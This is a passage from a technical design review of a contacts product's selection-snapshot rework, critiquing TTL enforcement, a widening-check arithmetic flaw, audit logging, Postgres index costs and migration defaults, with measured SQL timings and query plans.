is the right answer and it is right for the right reason: it records identity instead of inferring
it, so neither the negation inversion nor the commit-order hole has anywhere to attach. There is no
`¬P` to prove absence for, and no timestamp whose ordering can disagree with commit order. The two
measured counterexamples that killed §10 are both dead, and I could not construct a third.

What §8 has instead is four defects of the "a few lines of spec" kind, not of the "redesign" kind:
**no enforced TTL at all** (S20), **the widening check now fires spuriously on a normal UI action**,
which directly contradicts §8.4 (S21), **the audit log loses the predicate** (S22), and **§8.3's
cost statement is understated by two orders of magnitude** (S23).

Separately, **§6 as rewritten is not shippable** (S24) — and that one is partly my fault, because
my recommendation named the right direction and not the right shape. Measured below.

Nothing here needs another round of design. Fix S20–S24 and this is ready to plan.

---

## Does §8 survive? The five attacks you asked for

### Attack 1 — a path to a contact outside the snapshot

I found no path that *widens* the set. I found two that matter anyway.

**1a. The snapshot is not a source of ids; it must be a filter on `contacts`.** §8.2 says "a bulk
action joins `selection_snapshot_members`". If an implementer reads it literally —
`insert into contact_tags (...) select $ws, contact_id, $tag from selection_snapshot_members where
snapshot_id = $2` — then a contact deleted between selection and action is still in the snapshot,
`contact_tags`'s composite foreign key rejects the row, and **the whole bulk action fails** with a
foreign-key violation because one contact was deleted. Not unsafe, but a bulk tag of 500,000 that
dies on one deleted contact is an outage-shaped bug, and it is the obvious way to write it.

Say it explicitly: the `sel` CTE stays
`select id from contacts where workspace_id = $1 and id in (select contact_id from
selection_snapshot_members where workspace_id = $1 and snapshot_id = $2)`.
The snapshot narrows `contacts`; it never supplies ids on its own. That also re-establishes tenancy
at read time, which matters because of 1b.

**1b. `selection_snapshot_members` has no foreign key to `contacts`.** M1a's stated principle is
that a cross-tenant row must be *unrepresentable*, not merely unwritten: *"Composite foreign keys
`(workspace_id, id)` are the point … Tenancy becomes a property of the schema rather than of every
query an implementer remembers to scope."* This table breaks that, silently, and it is the first
table in the product to hold `contact_id` without the composite key.

I do **not** think you should add the FK — I checked the cost and it is worse than the disease. A
foreign key to `contacts (workspace_id, id)` with `on delete cascade` needs an index on
`(workspace_id, contact_id)` on the members table for the cascade; the primary key
`(workspace_id, snapshot_id, contact_id)` cannot serve it, so every contact delete would scan the
members table, and `bulk/delete` of 1M contacts would do 1M scans.

So: keep no FK, and write the exception down the way M1a writes its other deliberate exceptions —
*"this is the one tenant table without a composite foreign key; tenancy is re-established by
resolving every snapshot through `contacts` (1a), and a dangling `contact_id` is harmless because
UUIDv7 is never reused."* That last clause is load-bearing and worth stating: the design is only
safe against a dangling id because ids are not recycled.

### Attack 2 — a contact deleted or merged between selection and action

**Deleted: correct, and reported.** The id dangles, the join through `contacts` drops it,
`selected < issued`, and the existing gap carries it. Erasure behaves the same, and nothing blocks
an erasure because there is no FK. Good.

**Merged: there is no merge today, and that is the only reason this is safe.** Contacts cannot be
merged and `UpdateContact` has no `email` field by design, so no contact can be replaced by
another. The moment M1c's importer gains any de-duplication that *deletes* a contact in favour of a
survivor, a snapshot holding the deleted id silently loses that person — under-inclusion with no
signal, because the survivor who now represents them is not in the set. Add it to §15.3: **an
importer may update a contact, never replace one; if a merge is ever built it must remap snapshot
members or invalidate live snapshots.**

**The case §8.2 should state and does not:** a contact who **unsubscribes between selection and
action is still in the frozen set**, and `bulk/subscribe` will run against them. That reads like
exactly the compliance failure this product exists to prevent — and it is safe, but only because of
two separate M1a decisions: `selection::subscribe` uses `on conflict (contact_id, list_id) do
nothing`, so an existing `unsubscribed` row is never revived, and eligibility is re-checked at send
time against `mailable_list_members`. Freezing the set is therefore safe *because* subscribe is
non-destructive, not on its own merits. Write that dependency down in §8.2. If `bulk/subscribe`
ever becomes `do update` — and `lists::add_member` already is (§15.3 notes they disagree) — then
freezing turns into a re-subscription bug, and nothing in §8 would warn the person making that
change.

### Attack 3 — the 1M-row `insert … select` inside the selection request. **Yes, waved past.**

Measured, on a 1M-row table with no predicate beyond `workspace_id` (so this is the floor, not a
realistic segment):

```
insert into snap_members (workspace_id, snapshot_id, contact_id)
  select workspace_id, $snap, id from ct where workspace_id = $1;
INSERT 0 1000000      Time: 4887.667 ms
pg_total_relation_size('snap_members')  ->  158 MB
delete from snap_members where snapshot_id = $snap;   Time: 850.401 ms
```

- **4.9 seconds**, against `spec.md:457`'s p95 < 150 ms for UI API responses. A real segment adds
  its own predicate cost on top, and §5 exists precisely because the *count* alone may exceed
  1.5 s at scale. The selection endpoint does the count **and** a 158 MB write, with no
  `statement_timeout`, no progress, and no stated budget. §16 records the 1M cap as a deviation but
  not the latency, and the latency is the part an operator feels.
- **158 MB per snapshot**, live for an hour. §8.3 states the cost as "one row per match" — that is
  true and it is not the cost. State the bytes and the seconds; they are what sizing a box needs.
- **Same dropped-handler-future problem §15.3 names for the importer.** A five-second request that
  a client can abandon: axum drops the future, the transaction aborts, and the editor clicks again.
  §15.3 catches this for M1c and §8 reproduces it in M1b. At 4.9 s it is survivable (unlike a
  two-minute import), but say which way it is meant to fail.
- **No rate limit on `POST /contacts/selection`.** §12 rate-limits *preview*, which costs 1.5 s of
  one connection, and leaves unlimited the endpoint that costs 5 s and 158 MB. An editor holding
  the button writes gigabytes within the hour and takes the 20-connection pool
  (`src/db.rs`) with it. Two fixes, both cheap, take both: rate-limit selection at least as hard as
  preview, and **supersede the actor's previous live snapshot when a new one is created** — the UI
  only ever has one active selection, so the second is free and bounds a workspace's live footprint
  to roughly one snapshot per editor.
- **The cap needs an implementable definition.** §8.3 refuses above 1,000,000 "naming the count".
  Naming it requires a counting pass *before* the insert, which doubles the work and races with the
  insert. Either `insert … limit 1000001`, check `rows_affected`, roll back and report "more than
  1,000,000" without naming it, or pay for the second pass and say so. As written it reads like one
  statement and cannot be.
- **Consider `unlogged`.** `selection_snapshot_members` is ephemeral, recreatable and expires in an
  hour. `create unlogged table` removes it from the WAL — roughly halving the write cost of every
  selection and removing 158 MB per selection from backups and replication. The failure mode is
  clean and matches the design: a crash truncates the table, outstanding tokens resolve to nothing,
  and the user re-selects, which is the same path the one-hour TTL already produces. The cost is
  that snapshots do not reach a physical standby. Worth a line either way; I would take it.
- **Churn.** Insert 158 MB and delete it an hour later, repeatedly, on a table nothing else reads.
  Default autovacuum thresholds will not keep up, and the table will bloat. Either set per-table
  autovacuum settings in the migration, or partition by expiry hour and `DROP` the partition —
  `DROP`/`TRUNCATE` is O(1) and leaves nothing to vacuum, which is the real fix and is also the
  reaper (see Attack 4).

### Attack 4 — can the reaper lose rows or leave orphans?

**Orphans: no, provided one transaction.** The FK on `(workspace_id, snapshot_id)` forces the
parent row to exist before members can be written, and the cascade delete is served by the members
primary key's leading columns, so the sweep is index-driven. The one hole: if the parent commits
and the member insert then fails, you get a snapshot whose `size` says N and which holds zero
members — harmless (the action resolves to nothing) but confusing. §8 should say parent and members
commit in one transaction, and that `size` is the insert's own `rows_affected`, never a separate
count.

**Losing rows: no. Not reaping them: yes, and this is the real defect.**

§8.3 says the sweep "rides an existing periodic write … the way M0's session sweep rides `resolve`'s
once-a-minute `last_seen_at` write". I read that code (`src/auth/sessions.rs:102-120`). It is
`delete from sessions where expires_at <= now()`, run **inline, inside a user's request**, at most
once a minute, best-effort. Two consequences that do not survive the move from sessions to
snapshots:

1. **It only runs while someone is logged in.** A session row is ~200 bytes, so an idle instance
   accumulating unreaped sessions is nothing. A snapshot is **158 MB**. An instance whose editors
   go home on Friday keeps every Friday-afternoon snapshot until Monday. Nothing else deletes them.
2. **The sweep's cost lands in a stranger's request.** Measured: deleting one 1M-row snapshot is
   **850 ms**, and the sweep's `delete … where expires_at < now()` cascades across however many
   expired at once. A user's session-resolve — on the hot path of every authenticated request — can
   now block for seconds. The session sweep is cheap because sessions are cheap; this one is not.

Fix: give snapshots their own bounded sweep. Delete **at most one expired snapshot per pass** (or
cap by row count), which keeps the inline cost near the measured 850 ms worst case and still clears
the backlog at one per minute; or partition by expiry hour and `DROP` the partition, which is O(1)
and solves the churn in Attack 3 at the same time. Either is a few lines. The current wording
inherits a mechanism sized for 200-byte rows.

### Attack 5 — `excluded_ids` against a frozen set. **This one breaks §8.4.**

§8.4 says `refuse_if_widened` is "unreachable by construction, and a test asserts it does not fire
on a normal action". It is reachable, and a normal UI action reaches it.

M1a's check is `selected.saturating_add(excluded) > issued` (`Selection::widened`,
`src/contacts/selection.rs`). Under §8, `issued = |S|` exactly and `selected = |S| − |E ∩ S|`. So:

```
selected + |E|  =  |S| − |E ∩ S| + |E|  =  |S| + |E \ S|  >  |S| = issued
```

whenever **any excluded id is not in the snapshot**. Not "widened" — the set cannot widen — but
refused all the same, with `409 selection-widened`, a message that is now simply false.

And snapshots make that *more* likely, not less. ADR 0003 already documents the path: the contacts
grid applies the live filter, `refetchOnWindowFocus` is on, and a contact that matches the filter
but is not in the selection is drawn as a ticked row. Under the predicate design the divergence was
contacts created after `as_of`. Under snapshots the grid diverges from the frozen set by **every**
contact created, edited, tagged or subscribed since the selection. Untick one of those — the single
most ordinary thing a person does on that screen — and the action is refused.

Fix, one line of arithmetic: with `issued = |S|` the exclusion term is meaningless, because an
exclusion outside the set excludes nothing. The guard becomes `selected > issued`, which holds
trivially and makes §8.4's "unreachable by construction" true as stated. Keep the function, keep
the test, drop the `+ excluded`. ADR 0003's paragraph explaining why the exclusions are added back
describes the predicate design and must be marked as superseded along with the rest of it (S22).

The deeper fix is worth one line in §14: now that identity is recorded, **the grid can show the
selection**. A `GET /contacts?snapshot_id=…` lets the user see and untick exactly the frozen set,
which removes the divergence at the source and retires both of ADR 0003's documented over-refusal
paths. Not required for M1b; it is the natural shape once the set exists, and §14 currently has no
"here is what you have selected" state at all.

---

## Findings

### S20 — §8.5: the one-hour TTL is no longer enforced anywhere. **Highest severity in the rework.**

M1a enforces expiry in `selection::parse`, from the token itself:

```rust
let issued = selection.as_of.get_timestamp().ok_or_else(invalid)?;
…
if SystemTime::now().duration_since(issued).unwrap_or_default() > TTL {
    return Err(ApiError::Unprocessable("selection-expired"));
}
```

§8.5 removes `as_of` and defines the payload as `{workspace_id, snapshot_id, issued}` — **no
timestamp**. So `parse` has nothing to compute an age from, and the TTL check cannot be written.
What remains is `expires_at` on the row plus a sweep that, per Attack 4, may not run for days. A
token from Friday still joins its un-reaped snapshot on Monday and acts.

That is a straight regression on a property M1a enforced cryptographically, without a database
round trip, and it is the property that stops "everyone matching X, as of this morning" being acted
on tomorrow.

Two one-line fixes, take both:

- **Mint `snapshot_id` as `Uuid::now_v7()`.** The timestamp comes back for free, `parse` keeps
  working unchanged, and the check stays where it is — before the database is touched. Everything
  else in the product already mints v7.
- **Check `expires_at` at use**, not only in the sweep: the `sel` CTE joins
  `selection_snapshots s … and s.expires_at > now()`. Expiry then does not depend on the reaper
  having run, which is what makes the reaper's laziness (Attack 4) tolerable.

§17 should test it: a token whose snapshot has expired but has not been swept is refused.

### S21 — §8.4: the widening check fires on a normal action

Attack 5. §8.4's central claim is false as the code stands, and the test it proposes ("asserts it
does not fire on a normal action") would pass only because it does not model the grid refetch that
ADR 0003 documents. Change the comparison to `selected > issued`; then keep the check and the test,
and §8.4's reasoning for keeping it becomes correct.

### S22 — §8: the audit row loses the predicate, and ADR 0003 is not superseded

**The audit regression.** ADR 0003: *"One audit row records the action, predicate, `as_of`, `issued`
and both counts."* Under §8 the token carries no predicate, so the bulk audit row can record only a
`snapshot_id` — and the snapshot is deleted an hour later. The audit log is left saying *"deleted
417,004 contacts, snapshot `0192…`"* with no way, ever, to learn who they were or what rule
described them. For the one action that cannot be undone, in a product whose audit log is a
compliance artefact, that is a worse record than M1a had.

Fix: store the filter on `selection_snapshots` (`filter jsonb not null`) at creation, and copy it
into the bulk audit row. Apply M1a's existing rule — **`q` is not recorded**, because audit metadata
outlives a GDPR erasure — so the stored filter is redacted of `q` on the way in, exactly as §10 does
for export. One column, and it also makes the snapshot self-describing for the UI.

**The ADR.** ADR 0003 is titled *"Selection is a snapshotted predicate"* and essentially all of it is
now wrong: the predicate has left the token, the widening check is no longer the guarantee, the
"Cost if wrong" section describes a failure mode that no longer exists, and the alternative it
rejects — materialising the matched set — is what this milestone builds. The spec updates the
glossary for the rename (§11) and says nothing about the ADR. M1a's convention is that architectural
decisions live in `docs/adr/`, so §8 needs a line: **ADR 0003 is superseded by a new ADR (0004,
"Selection is a materialised set"), with 0003 marked superseded and kept** — the same reasoning §11
uses for not rewriting old audit strings. The doc comments on `Selection` and `Selection::widened`
in `src/contacts/selection.rs` carry the same superseded argument at length and need the same
treatment.

### S23 — §8.3: "the cost, stated" is understated by two orders of magnitude

Attack 3. §8.3 states the cost as one row per match plus a sweep. Measured, it is **4.9 seconds and
158 MB per 1M-contact selection**, in a request budgeted at p95 < 150 ms, with no timeout, no rate
limit, no live-snapshot cap per workspace, and a sweep whose inline worst case is 850 ms in a
stranger's request. The section is titled "The cost, stated"; state it. Add the latency to §16 as
a fifth recorded deviation — `spec.md:457`'s 150 ms budget is one M1b endpoint cannot meet, and
that is a defensible deviation but not a silent one.

### S24 — §6: an index per custom field definition is not shippable as written

This one corrects my own earlier recommendation, which named the direction and not the shape.

**(a) The partial-on-workspace form does not work with a bound parameter.** Measured:

```
set plan_cache_mode = force_generic_plan;
prepare g (uuid) as select count(*) from ct where workspace_id = $1 and attributes ->> 'plan' = 'pro';
explain execute g (…);
   ->  Parallel Seq Scan on ct          -- partial index NOT used
```

A partial index `where workspace_id = '<const>'` can only be used when the planner can prove the
query implies its predicate, which it cannot do for `workspace_id = $1` under a generic plan — and
sqlx caches prepared statements per connection, so a repeated segment query gets exactly that after
the sixth execution. It works under a custom plan and stops working later, which is the worst
possible failure shape: fast in testing, seq scan in production, nothing changed.

The form that works is **composite, not partial** — and it measured the same size:

```
create index … on contacts (workspace_id, (attributes ->> '<key>'));
   ->  Bitmap Index Scan on ct_plan_ws2
       Index Cond: ((workspace_id = $1) AND ((attributes ->> 'plan') = 'pro'))
partial 6792 kB | composite 6968 kB
```

**(b) One index per definition multiplies across tenants.** The index is on `contacts`, which is
every workspace's contacts. Fifty workspaces with twenty custom fields each is **a thousand indexes
on one table**, every one of them maintained on every insert and update of every contact, including
during M1c's 1M-row import. That is far worse write amplification than the single GIN index §6
removes, and §6 does not bound it.

**(c) `CREATE INDEX` cannot live in the create-custom-field handler.** It takes a `SHARE` lock on
`contacts`, blocking every write to contacts for the duration of the build — minutes at 10M rows,
triggered by an admin adding a field. `CREATE INDEX CONCURRENTLY` is the answer and **cannot run
inside a transaction block**, so it cannot be in the handler's transaction at all, and it can fail
leaving an `INVALID` index that must be detected and dropped. §6 says "created and dropped with the
definition" as though it were one more statement in the handler. It is a detached task with a
failure mode.

What I would do, in order:

1. **Drop attribute indexing from M1b entirely.** Nothing runs at 10M yet (M1a's own "no load
   testing" gap is still open), `is_set` already has no index and §19 accepts that, and this
   removes a DDL-on-CRUD subsystem, a lock hazard and a detached task from the milestone. Then be
   honest in §5: an attribute rule that times out reports "too many to count exactly" rather than a
   planner number — because §5's own note says the estimate is only usable *because* of §6, and
   without §6 it is the 66×-low number I measured. Say that plainly instead of shipping an index to
   prop up an estimate.
2. If you keep indexing: **composite `(workspace_id, (attributes ->> key))`**, created
   `CONCURRENTLY` from a detached task, **on demand** — when a segment first filters on that key,
   not when the field is defined — with a per-workspace cap and an `INVALID`-index sweep. That
   bounds (b) to fields anyone actually filters on, which is a small fraction of twenty.

Either way §19's "`is_set` still has no index — measure before adding a second index" is the right
instinct applied to the wrong operator; apply it to `eq` as well.

### S25 — §7: `list_memberships.updated_at`'s stated justification is false

§7 keeps the column "for its own sake — a status change currently leaves no timestamp at all".
It does. `list_memberships` already has `subscribed_at` **and** `unsubscribed_at` (migration 0012),
and both are maintained: `selection::unsubscribe` sets `unsubscribed_at = now()`, and
`lists::add_member` and `selection::subscribe` set `subscribed_at`. Both transitions that exist are
already timestamped.

So `updated_at` is now redundant *and* unowned: nothing in the rework says who maintains it, and the
previous draft's "every status write sets it explicitly" went out with §10. Added as specified, it
is backfilled to `created_at` and then never moves — a column that lies. **Drop it.** That is one
fewer migration line, one fewer invariant with no owner, and the stated need is already met.

### S26 — §7: `source text not null default 'api'` backfills every existing row with a false provenance

§15.1's whole argument is that provenance cannot be reconstructed later. Stamping every
pre-existing membership `'api'` — including every row written by the UI and by `bulk/subscribe` —
destroys exactly the distinction the column exists to create, permanently, in the same migration
that creates it. Use `'unknown'` for the backfill (or leave the column nullable and let NULL mean
"written before provenance existed"), and set it explicitly on every new write.

Also, M1a's style for a constrained string is a `check (… in (…))` — `lists.visibility`,
`list_memberships.status`, `suppressions.reason` and `imports.status` all carry one. `source` has
none. Add the check with the values M1b can actually write (`ui`, `api`, `bulk`), and let M1c add
`import` to it.

### S27 — §9: the reasoning is not too convenient, but it is incomplete by one sentence

You asked. I think §9 is sound. ADR 0003's argument for refusing a widened `subscribe` names a
specific harm — *"a widened subscribe between a selection and a campaign puts people on a list they
were never selected for"* — and that harm is about **which contacts**, which snapshots answer
completely and for every action kind. Deriving the `tag` decision from a structural property rather
than from "nothing mails a tag today" is strictly better than what ADR 0003 had, and keeping the
refusals as defence in depth is consistent with §8.4.

The incompleteness: snapshots answer *which contacts*, not *what the operator understood they were
agreeing to*. Once M2 can target a tag, "Tag 5,000 contacts" is a button that makes 5,000 people
mailable by a future campaign, and the person clicking it is not told. That is a **confirmation-copy**
obligation, not a refusal — one line in §14 next to the export confirmation, which already names
"contains personal data". Add it and §9 is complete.

The genuine residual is issue `03` (the confirmed count never reaches the server), which §9 does not
mention and which snapshots make cheap to close for the first time: the client can send the size it
displayed and the server compare it with `size`. Not M1b work; worth noting in §19 that the issue
changed shape.

### S28 — smaller things

- **§8 does not say what happens to an id-list selection.** `Selection::of_ids` (≤ 10,000 ticked
  rows) is already a frozen set and needs no snapshot, but §8 reads as though every selection
  materialises. Say that `of_ids` is unchanged and carries no `snapshot_id`, or there will be two
  interpretations and a `null` in the payload that `deny_unknown_fields` will argue with.
- **`MAX_EXCLUDED` is 10,000 against a snapshot of 1,000,000.** Selecting a million and unticking
  twenty thousand is now a `422`. Pre-existing limit, newly reachable; either raise it or say the
  UI must prevent it.
- **The UI must not offer "select all matching" from an estimate.** §5 guarantees `issued` is exact
  because the snapshot counts itself, which is right — but the user reaches that button from a
  preview that may have shown `~12,400`. If the real count is 3M the click costs fifteen seconds
  and ends in `422 selection-too-large`. One line in §14.
- **`segment_id` joins `ContactFilter`** (§10 and §12 both assume it) and the spec never says so.
  It is now free — `ContactFilter` is no longer inside a signed payload, so there is no token-format
  consequence — but §4.2's refusal of an unresolvable `segment_id` has to apply on the **grid and
  export** paths too, not only segment CRUD. §17's structural test covers the compiler; add the
  filter path.
- **§7 numbering:** the rework renumbers migrations (`0017_selection_snapshots`,
  `0018_membership_provenance`) relative to the superseded draft. Harmless now, since neither has
  been written; worth a glance when M1c adds its own.

---

## On the two things you did not do

**Idempotency keys: agreed, and your reasoning is better than mine.** I flagged it against
`spec.md`'s stated convention; you are right that the convention bites where a retry is expensive
and not where it is free. `unique (workspace_id, name)` makes a retried `POST /segments` a `409`
rather than a duplicate, and `POST /contacts/selection` is naturally retry-safe now — a second
snapshot is wasteful (see Attack 3's supersede-the-previous suggestion) but not wrong. The endpoint
that needs the key is the importer's `start`, and it arrives with M1c. Recording it as owed is the
right call. One refinement: record it as owed **in M1c's scope**, not just as a note, so it is a
task and not a memory.

**Keeping `refuse_if_widened`: agreed, with S21 attached.** Keeping an unreachable guard as a
tripwire is exactly M1a's reasoning for the `affected > promised` branch in `describe()` —
*"three lines on the one direction that cannot be undone, where the fall-through would otherwise
render as success. Defence in depth, not covered behaviour."* Same shape, same justification, keep
it. But it has to actually be unreachable first: as the arithmetic stands it fires on an ordinary
untick, and a tripwire that fires in normal operation gets deleted by whoever is on call. Fix the
comparison, then the test you describe is worth having.
